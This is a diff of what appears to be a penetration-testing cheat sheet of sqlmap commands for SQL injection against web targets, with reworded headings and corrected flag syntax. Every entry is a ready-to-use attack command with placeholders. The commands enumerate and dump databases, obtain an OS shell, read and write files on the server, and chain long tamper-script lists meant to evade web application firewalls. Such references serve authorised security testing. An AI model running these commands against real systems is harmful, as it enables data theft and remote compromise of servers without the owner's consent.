@@ -3,107 +3,102 @@
 % sql injection
 #plateform/linux #target/remote #cat/ATTACK/INJECTION  #port/80 #port/443 #port/8080 #port/8443
 
-## basic sqlmap step 1
-```
-sqlmap -u <url> -p <arguments> --dbs
-```
-
-## basic sqlmap step 2
-```
-sqlmap -u <url> -p <arguments> --dbms=<database_type>
-```
-
-## basic sqlmap step 3
-```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> --tables
-```
-
-## basic sqlmap step 4
-```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> --columns
-```
-
-## basic sqlmap step 5
-```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
-```
-
-## sqlmap - list dbs
+## SQLMap - Enumerate Databases
 ```
 sqlmap -u <url> --dbs
 ```
 
-## sqlmap - list tables
+## SQLMap - Enumerate Tables
+```
+sqlmap -u <url> -D <database_name> --tables
+```
+
+## SQLMap - Enumerate Columns
+```
+sqlmap -u <url> -D <database_name> -T <table_name> --columns
+```
+
+## SQLMap - Dump Data
+```
+sqlmap -u <url> -D <database_name> -T <table_name> -C <column_names> --dump
+```
+
+## SQLMap - List Databases
+```
+sqlmap -u <url> --dbs
+```
+
+## SQLMap - List Tables
 ```
 sqlmap -u <url> -D <db> --tables
 ```
 
-## sqlmap - dump a table
+## SQLMap - Dump a Table
 ```
 sqlmap -u <url> -D <db> -T <table> --dump
 ```
 
-## sqlmap - list columns of a table
+## SQLMap - List Columns of a Table
 ```
 sqlmap -u <url> -D <db> -T <table> --columns
 ```
 
-## sqlmap - dump only some tables columns
+## SQLMap - Dump Specific Columns from a Table
 ```
 sqlmap -u <url> -D <db> -T <table> -C <c1>,<c2> --dump
 ```
 
-## sqlmap - get shell
+## SQLMap - Get OS Shell
 ```
 sqlmap -u <url> --os-shell
 ```
 
-## sqlmap - file read
+## SQLMap - File Read
 ```
 sqlmap -u <url> --file-read=<remote_file>
 ```
 
-## sqlmap - file write
+## SQLMap - File Write
 ```
 sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
 ```
 
-## sqlmap - classic get
+## SQLMap - Classic GET Request
 ```
 sqlmap -u <url>
 ```
 
-## sqlmap - classic post
+## SQLMap - Classic POST Request
 ```
-sqlmap -u <url> -d "<params>"
+sqlmap -u <url> --data="<params>"
 ```
 
-## sqlmap - get with cookie
+## SQLMap - GET Request with Cookie
 ```
 sqlmap -u <url> --cookie=<cookie>
 ```
 
-## sqlmap - use file
+## SQLMap - Use Request File
 ```
 sqlmap -r <request_file>
 ```
 
-## sqlmap - classic with tamper
+## SQLMap - Classic with Tamper Scripts
 ```
-sqlmap -u '<url>' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+sqlmap -u '<url>' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 
-## sqlmap - hardcore
+## SQLMap - Hardcore Scan
 ```
 sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
 ```
 
-## sqlmap - mysql tamper list
+## SQLMap - MySQL Tamper List
 ```
-sqlmap -u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+sqlmap -u <url> --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 
-## sqlmap - mssql tamper list
+## SQLMap - MSSQL Tamper List
 ```
-sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+sqlmap -u <url> --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
 ```
